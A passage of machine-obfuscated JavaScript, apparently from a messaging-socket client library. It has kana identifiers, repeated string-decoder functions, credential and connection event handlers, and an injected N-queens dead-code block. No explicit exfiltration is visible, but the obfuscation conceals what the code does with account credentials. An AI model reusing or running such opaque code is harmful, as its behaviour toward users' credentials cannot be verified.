              'S0!U}sp~g?z*G<^&KT5|ji6_wf4VOX)Dvmayh.;`n1J8e"@l{cxH$B(%d[:7ZNA>Co293EbF+MRt]=Yu/#krW,qILQP',
            なす,
            はね,
            をは,
            つな,
            ぬひ,
            をへ,
            ほの;
          へら(
            (なす = "" + (つき || "")),
            (はね = なす.length),
            (をは = []),
            (つな = なる[0x0]),
            (ぬひ = なる[0x0]),
            (をへ = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < はね; ほの++) {
            var てろ = うし.indexOf(なす[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (をへ < なる[0x0]) {
              をへ = てろ;
            } else {
              へら(
                (をへ += てろ * なる[0xc]),
                (つな |= をへ << ぬひ),
                (ぬひ +=
                  (をへ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  をは.push(つな & なる[0x3]),
                  (つな >>= なる[0x2]),
                  (ぬひ -= なる[0x2]),
                );
              } while (ぬひ > なる[0x9]);
              をへ = -なる[0x1];
            }
          }
          if (をへ > -なる[0x1]) {
            をは.push((つな | (をへ << ぬひ)) & なる[0x3]);
          }
          return ぬは(をは);
        }
        function なす(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = うし(やぬ[つき]));
          }
          return すは[つき];
        }
        へら(
          await ひと(),
          await よせ(ぬひ(0x1af)),
          をへ[ぬひ(なる[0x55])](なす(0x1b0)),
          clearTimeout(うた),
          きな[なす(なる[0x57])](なす(0x1b2), {
            [なる[0x20]]: {
              ...てろ[なす(0x1b3)][なる[0x20]],
              [なす(なる[0x56])]: つき[なす(0x1b5)][なす(なる[0x56])],
              [なす(0x1b6)]: たて(てろ?.creds?.me?.id)?.user,
              [なす(0x1b7)]: なす(0x1b8),
            },
          }),
          きな[なす(なる[0x57])](なす(0x1b9), { [なす(0x1ba)]: なす(0x1bb) }),
        );
      } catch (はね) {
        function をは(つき) {
          var うし =
              'PFTkAYmjMSqhWJ;Q4/le}~x()a[0w$5H7b^=Bn>L6{prRZ`G2_yCco1U,!3Of"v#*+u8%d?&<:KDg|iIXNs].@Etz9V',
            なす,
            はね,
            をは,
            つな,
            ぬひ,
            をへ,
            ほの;
          へら(
            (なす = "" + (つき || "")),
            (はね = なす.length),
            (をは = []),
            (つな = なる[0x0]),
            (ぬひ = なる[0x0]),
            (をへ = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < はね; ほの++) {
            var てろ = うし.indexOf(なす[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (をへ < なる[0x0]) {
              をへ = てろ;
            } else {
              へら(
                (をへ += てろ * なる[0xc]),
                (つな |= をへ << ぬひ),
                (ぬひ +=
                  (をへ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  をは.push(つな & なる[0x3]),
                  (つな >>= なる[0x2]),
                  (ぬひ -= なる[0x2]),
                );
              } while (ぬひ > なる[0x9]);
              をへ = -なる[0x1];
            }
          }
          if (をへ > -なる[0x1]) {
            をは.push((つな | (をへ << ぬひ)) & なる[0x3]);
          }
          return ぬは(をは);
        }
        function つな(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = をは(やぬ[つき]));
          }
          return すは[つき];
        }
        へら(
          console[ぬひ(なる[0x4a])](ぬひ(0x1bc) + はね),
          process[つな(0x1bd)](なる[0x1]),
        );
      }
    }),
    ほせ[なる[0x18]](ぬひ(0x1be), (つき) => {
      function うし(つき) {
        var うし =
            'MCq8T{cpz*U=%1w>/nG,QItf7gvr}|iJWL4dV?[b6BD~Ex($OZke3&AHy;`#0l)+_"@:!Yh.<Pa2u9]S^jmFoKXRNs5',
          なす,
          はね,
          をは,
          ぬひ,
          をへ,
          つな,
          ほの;
        へら(
          (なす = "" + (つき || "")),
          (はね = なす.length),
          (をは = []),
          (ぬひ = なる[0x0]),
          (をへ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < はね; ほの++) {
          var てろ = うし.indexOf(なす[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (ぬひ |= つな << をへ),
              (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                をは.push(ぬひ & なる[0x3]),
                (ぬひ >>= なる[0x2]),
                (をへ -= なる[0x2]),
              );
            } while (をへ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
          をは.push((ぬひ | (つな << をへ)) & なる[0x3]);
        }
        return ぬは(をは);
      }
      function なす(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = うし(やぬ[つき]));
        }
        return すは[つき];
      }
      をへ[ぬひ(なる[0x4a])]({ [ぬひ(0x1bf)]: つき }, ぬひ(0x1c0));
      const { [ぬひ(0x1c1)]: はね, [なす(なる[0x59])]: をは } = ねね(つき);
      やの(
        new さは(なす(0x1c3) + はね + なる[0x58], {
          [なす(なる[0x59])]: をは,
          [なす(0x1c4)]: つき,
        }),
      );
    }),
    ほせ[なる[0x18]](ぬひ(0x1c5), (つき) => {
      function うし(つき) {
        var うし =
            '4cDVMAT6.>K%5L&j;!q3fFHd+B@v0eZRb]k`Sm~#u=2|x:Q18NGaU/n9$Ow{_},Ig)"YC7*lJz[yE^P(prXW?st<oih',
          なす,
          はね,
          ぬひ,
          をは,
          をへ,
          つな,
          ほの;
        へら(
          (なす = "" + (つき || "")),
          (はね = なす.length),
          (ぬひ = []),
          (をは = なる[0x0]),
          (をへ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < はね; ほの++) {
          var てろ = うし.indexOf(なす[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (をは |= つな << をへ),
              (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                ぬひ.push(をは & なる[0x3]),
                (をは >>= なる[0x2]),
                (をへ -= なる[0x2]),
              );
            } while (をへ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
          ぬひ.push((をは | (つな << をへ)) & なる[0x3]);
        }
        return ぬは(ぬひ);
      }
      function なす(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = うし(やぬ[つき]));
        }
        return すは[つき];
      }
      const はね = +(つき[ぬひ(なる[0x4c])][なす(0x1c6)] || なる[0x5e]);
      やの(
        new さは(なす(0x1c7), {
          [なす(0x1c8)]: はね,
          [なす(0x1c9)]: つき[なす(0x1ca)],
        }),
      );
    }),
    ほせ[なる[0x18]](ぬひ(0x1cb), () => {
      やの(new さは(ぬひ(0x1cc), { [ぬひ(なる[0x4b])]: せけ[ぬひ(0x1cd)] }));
    }),
    ほせ[なる[0x18]](ぬひ(0x1ce), (つき) => {
      へら(
        をへ[ぬひ(なる[0x55])](ぬひ(0x1cf), JSON[ぬひ(0x1d0)](つき)),
        すゆ({
          [ぬひ(なる[0x3c])]: "ib",
          [ぬひ(なる[0x4c])]: {},
          [ぬひ(0x1d1)]: [
            {
              [ぬひ(なる[0x3c])]: ぬひ(0x1d2),
              [ぬひ(なる[0x4c])]: { [ぬひ(0x1d3)]: ぬひ(0x1d4) },
            },
          ],
        }),
      );
    }),
    ほせ[なる[0x18]](ぬひ(0x1d5), (つき) => {
      function うし(つき) {
        var うし =
            'QVyHtA.l(=f`?x>p!6S#P:LRE)[v{;hU8ZwF,i&21sD~%|mk*<WT]I3zb"egMBGY$c4ONq}X_n9jdaCuo/0r57@K+^J',
          なす,
          はね,
          をは,
          をへ,
          つな,
          ぬひ,
          ほの;
        へら(
          (なす = "" + (つき || "")),
          (はね = なす.length),
          (をは = []),
          (をへ = なる[0x0]),
          (つな = なる[0x0]),
          (ぬひ = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < はね; ほの++) {
          var てろ = うし.indexOf(なす[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (ぬひ < なる[0x0]) {
            ぬひ = てろ;
          } else {
            へら(
              (ぬひ += てろ * なる[0xc]),
              (をへ |= ぬひ << つな),
              (つな += (ぬひ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                をは.push(をへ & なる[0x3]),
                (をへ >>= なる[0x2]),
                (つな -= なる[0x2]),
              );
            } while (つな > なる[0x9]);
            ぬひ = -なる[0x1];
          }
        }
        if (ぬひ > -なる[0x1]) {
          をは.push((をへ | (ぬひ << つな)) & なる[0x3]);
        }
        return ぬは(をは);
      }
      function なす(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = うし(やぬ[つき]));
        }
        return すは[つき];
      }
      const はね = なほ(つき, ぬひ(0x1d6)),
        をは = なほ(はね, なす(0x1d7));
      if (をは?.content) {
        function をへ(つき) {
          var うし =
              '_jK#+u|*Uv=W}bi9cFQfHXTo/@E`h3NM8[(:5$G")w46lxqgn].J>s&dImDP7Sy{YCk;zL?aOBZA!Rpe,0t^<V%1~2r',
            なす,
            はね,
            をは,
            をへ,
            つな,
            ぬひ,
            ほの;
          へら(
            (なす = "" + (つき || "")),
            (はね = なす.length),
            (をは = []),
            (をへ = なる[0x0]),
            (つな = なる[0x0]),
            (ぬひ = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < はね; ほの++) {
            var てろ = うし.indexOf(なす[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (ぬひ < なる[0x0]) {
              ぬひ = てろ;
            } else {
              へら(
                (ぬひ += てろ * なる[0xc]),
                (をへ |= ぬひ << つな),
                (つな +=
                  (ぬひ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  をは.push(をへ & なる[0x3]),
                  (をへ >>= なる[0x2]),
                  (つな -= なる[0x2]),
                );
              } while (つな > なる[0x9]);
              ぬひ = -なる[0x1];
            }
          }
          if (ぬひ > -なる[0x1]) {
            をは.push((をへ | (ぬひ << つな)) & なる[0x3]);
          }
          return ぬは(をは);
        }
        function つな(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = をへ(やぬ[つき]));
          }
          return すは[つき];
        }
        へら(
          (てろ[なす(0x1d8)][つな(0x1d9)] = Buffer[つな(0x1da)](をは?.content)),
          きな[つな(0x1db)](つな(0x1dc), てろ[つな(0x1dd)]),
        );
      }
    }),
  );
  let ちこ = なる[0x11];
  へら(
    process[ぬひ(0x1de)](() => {
      function つき(つき) {
        var うし =
            '/bqBGEPNDVfFdIAcsSQZ5TM{]U*3.^"kn)u%joHmyhO6X2Ji1!v+R|r7L?gl@pw;`<9>[}804Y(aeK:$&tWC#=,x_z~',
          ぬひ,
          なす,
          はね,
          をは,
          をへ,
          つな,
          ほの;
        へら(
          (ぬひ = "" + (つき || "")),
          (なす = ぬひ.length),
          (はね = []),
          (をは = なる[0x0]),
          (をへ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < なす; ほの++) {
          var てろ = うし.indexOf(ぬひ[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (をは |= つな << をへ),
              (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                はね.push(をは & なる[0x3]),
                (をは >>= なる[0x2]),
                (をへ -= なる[0x2]),
              );
            } while (をへ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
          はね.push((をは | (つな << をへ)) & なる[0x3]);
        }
        return ぬは(はね);
      }
      function うし(うし) {
        if (typeof すは[うし] === なる[0x5]) {
          return (すは[うし] = つき(やぬ[うし]));
        }
        return すは[うし];
      }
      if (さな[なる[0x20]]?.id) {
        function ぬひ(つき) {
          var うし =
              '8H(:BknA`/%Njzi3p.PJgLOe#4DU}{6|y,")c]F*^?9=xaG01dbTMQ[C~+S@$KtZhR<q&5m_w>IoVrflW2vEXu;s!Y7',
            ぬひ,
            なす,
            はね,
            をは,
            をへ,
            つな,
            ほの;
          へら(
            (ぬひ = "" + (つき || "")),
            (なす = ぬひ.length),
            (はね = []),
            (をは = なる[0x0]),
            (をへ = なる[0x0]),
            (つな = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < なす; ほの++) {
            var てろ = うし.indexOf(ぬひ[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (つな < なる[0x0]) {
              つな = てろ;
            } else {
              へら(
                (つな += てろ * なる[0xc]),
                (をは |= つな << をへ),
                (をへ +=
                  (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  はね.push(をは & なる[0x3]),
                  (をは >>= なる[0x2]),
                  (をへ -= なる[0x2]),
                );
              } while (をへ > なる[0x9]);
              つな = -なる[0x1];
            }
          }
          if (つな > -なる[0x1]) {
            はね.push((をは | (つな << をへ)) & なる[0x3]);
          }
          return ぬは(はね);
        }
        function なす(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = ぬひ(やぬ[つき]));
          }
          return すは[つき];
        }
        へら(きな[なす(0x1df)](), (ちこ = なる[0x2e]));
      }
      きな[うし(0x1e0)](うし(0x1e1), {
        [うし(0x1e2)]: うし(0x1e3),
        [うし(0x1e4)]: なる[0x11],
        [なる[0x53]]: なる[0x54],
      });
    }),
    ほせ[なる[0x18]](ぬひ(0x1e5), (つき) => {
      function うし(つき) {
        var うし =
            'CeaNDihWK?w,n`1!jtxR0oOATVb=P]Mc>4q9Y@gG[.^5vJlmdSu:QB"pH7XLE#+k%<;U6~2Z|F8{}y$fr_s(&/3z)*I',
          なす,
          はね,
          をは,
          ぬひ,
          をへ,
          つな,
          ほの;
        へら(
          (なす = "" + (つき || "")),
          (はね = なす.length),
          (をは = []),
          (ぬひ = なる[0x0]),
          (をへ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < はね; ほの++) {
          var てろ = うし.indexOf(なす[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (ぬひ |= つな << をへ),
              (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                をは.push(ぬひ & なる[0x3]),
                (ぬひ >>= なる[0x2]),
                (をへ -= なる[0x2]),
              );
            } while (をへ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
          をは.push((ぬひ | (つな << をへ)) & なる[0x3]);
        }
        return ぬは(をは);
      }
      function なす(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = うし(やぬ[つき]));
        }
        return すは[つき];
      }
      const はね = なほ(つき, ぬひ(0x1e6)),
        をは = +(はね?.attrs.count || なる[0x0]);
      をへ[ぬひ(なる[0x55])](ぬひ(0x1e7) + をは + ぬひ(0x1e8));
      if (ちこ) {
        へら(きな[ぬひ(0x1e9)](), をへ[ぬひ(なる[0x2f])](ぬひ(0x1ea)));
      }
      きな[ぬひ(0x1eb)](なす(0x1ec), { [なす(0x1ed)]: なる[0x2e] });
    }),
    きな[なる[0x18]](ぬひ(0x1ee), (つき) => {
      const うし = つき[なる[0x20]]?.name;
      if (さな[なる[0x20]]?.name !== うし) {
        function なす(つき) {
          var うし =
              'GOSe,1"zTp[3]8tVX4}UY^xAlwoZ|L#_Na@`&K;5/Rvbyum.(M+6$>Q7:dD~c)0FjWBI!r=<*s9hC?n{2J%HqikPEgf',
            なす,
            はね,
            をは,
            ぬひ,
            をへ,
            つな,
            ほの;
          へら(
            (なす = "" + (つき || "")),
            (はね = なす.length),
            (をは = []),
            (ぬひ = なる[0x0]),
            (をへ = なる[0x0]),
            (つな = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < はね; ほの++) {
            var てろ = うし.indexOf(なす[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (つな < なる[0x0]) {
              つな = てろ;
            } else {
              へら(
                (つな += てろ * なる[0xc]),
                (ぬひ |= つな << をへ),
                (をへ +=
                  (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  をは.push(ぬひ & なる[0x3]),
                  (ぬひ >>= なる[0x2]),
                  (をへ -= なる[0x2]),
                );
              } while (をへ > なる[0x9]);
              つな = -なる[0x1];
            }
          }
          if (つな > -なる[0x1]) {
            をは.push((ぬひ | (つな << をへ)) & なる[0x3]);
          }
          return ぬは(をは);
        }
        function はね(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = なす(やぬ[つき]));
          }
          return すは[つき];
        }
        if (ぬひ(0x1ef) in とた) {
          をは();
        }
        function をは() {
          var つき = function (つき) {
              var なす = [];
              if (つき === なる[0x1] || つき >= なる[0x5a])
                うし(なす, [], つき, なる[0x0]);
              return なす;
            },
            うし,
            なす,
            はね;
          へら(
            (うし = function (つき, をは, ぬひ, をへ) {
              var つな;
              for (つな = をへ; つな < ぬひ; つな++) {
                var ほの;
                if (をは.length !== つな) return;
                for (ほの = なる[0x0]; ほの < ぬひ; ほの++)
                  if (はね(をは, [つな, ほの])) {
                    へら(
                      をは.push([つな, ほの]),
                      うし(つき, をは, ぬひ, つな + なる[0x1]),
                    );
                    if (をは.length === ぬひ) つき.push(なす(をは));
                    をは.pop();
                  }
              }
            }),
            (なす = function (つき) {
              var うし = [],
                なす,
                はね;
              なす = つき.length;
              for (はね = なる[0x0]; はね < なす; はね++) {
                var をは;
                うし[はね] = "";
                for (をは = なる[0x0]; をは < なす; をは++)
                  うし[はね] +=
                    つき[はね][なる[0x1]] === をは ? なる[0x5b] : なる[0x5c];
              }
              return うし;
            }),
            (はね = function (つき, うし) {
              var なす = つき.length,
                はね;
              for (はね = なる[0x0]; はね < なす; はね++) {
                if (
                  つき[はね][なる[0x0]] === うし[なる[0x0]] ||
                  つき[はね][なる[0x1]] === うし[なる[0x1]]
                )
                  return なる[0x11];
                if (
                  Math.abs(
                    (つき[はね][なる[0x0]] - うし[なる[0x0]]) /
                      (つき[はね][なる[0x1]] - うし[なる[0x1]]),
                  ) === なる[0x1]
                )
                  return なる[0x11];
              }
              return なる[0x2e];
            }),
            console.log(つき),
          );
        }
        へら(
          をへ[ぬひ(なる[0x5d])]({ [はね(なる[0x5f])]: うし }, はね(0x1f1)),
          すゆ({
            [はね(0x1f2)]: はね(0x1f3),
            [はね(なる[0x5e])]: { [はね(なる[0x5f])]: うし },
          })[はね(0x1f5)]((つき) => {
            function うし(つき) {
              var うし =
                  '<IReT|GNm!f3_/s]wV,Scb41d87>A{})QM*YO(u#[HE2;P$yDXq^:=rZ0lLFKhk9%Uai5?oxBjW~vJ+6&gt@p"zC.`n',
                なす,
                はね,
                をは,
                ぬひ,
                をへ,
                つな,
                ほの;
              へら(
                (なす = "" + (つき || "")),
                (はね = なす.length),
                (をは = []),
                (ぬひ = なる[0x0]),
                (をへ = なる[0x0]),
                (つな = -なる[0x1]),
              );
              for (ほの = なる[0x0]; ほの < はね; ほの++) {
                var てろ = うし.indexOf(なす[ほの]);
                if (てろ === -なる[0x1]) continue;
                if (つな < なる[0x0]) {
                  つな = てろ;
                } else {
                  へら(
                    (つな += てろ * なる[0xc]),
                    (ぬひ |= つな << をへ),
                    (をへ +=
                      (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
                  );
                  do {
                    へら(
                      をは.push(ぬひ & なる[0x3]),
                      (ぬひ >>= なる[0x2]),
                      (をへ -= なる[0x2]),
                    );
                  } while (をへ > なる[0x9]);
                  つな = -なる[0x1];
                }
              }
              if (つな > -なる[0x1]) {
                をは.push((ぬひ | (つな << をへ)) & なる[0x3]);
              }
              return ぬは(をは);
            }
            function なす(つき) {
              if (typeof すは[つき] === なる[0x5]) {
                return (すは[つき] = うし(やぬ[つき]));
              }
              return すは[つき];
            }
            をへ[なす(0x1f6)](
              { [なす(0x1f7)]: つき[なす(0x1f8)] },
              なす(0x1f9),
            );
          }),
        );
      }
      Object[ぬひ(0x1fa)](さな, つき);
    }),
  );
  return {
    [ぬひ(なる[0x60])]: なる[0x41],
    ws: ほせ,
    ev: きな,
    [ぬひ(0x1fb)]: { [ぬひ(なる[0x16])]: さな, [ぬひ(なる[0x17])]: なそ },
    [ぬひ(0x1fc)]: んち,
    get [ぬひ(0x1fd)]() {
      return てろ[ぬひ(なる[0x16])][なる[0x20]];
    },
    [ぬひ(0x1fe)]: ねせ,
    [ぬひ(0x1ff)]: よね,
    [ぬひ(0x200)]: やこ,
    [ぬひ(0x201)]: ねと,
    [ぬひ(0x202)]: ろき,
    [ぬひ(0x203)]: すゆ,
    [ぬひ(0x204)]: しせ,
    [ぬひ(0x205)]: やの,
    [ぬひ(0x206)]: たか,
    [ぬひ(0x207)]: ふふ,
    [ぬひ(0x208)]: ひと,
    [ぬひ(0x209)]: をよ,
    [ぬひ(0x20a)]: しさ(きな),
    [ぬひ(0x20b)]: うの,
    [ぬひ(0x20c)]: ぬひ(0x20d),
  };
};
function ねけ(をの) {
  return (そつ) => {
    をの(
      new さは(にり(0x20e) + そつ?.message + なる[0x58], {
        [にり(0x20f)]: つき(そつ),
        [にり(0x210)]: そつ,
      }),
    );
  };
}
function へら() {
  へら = function () {};
}
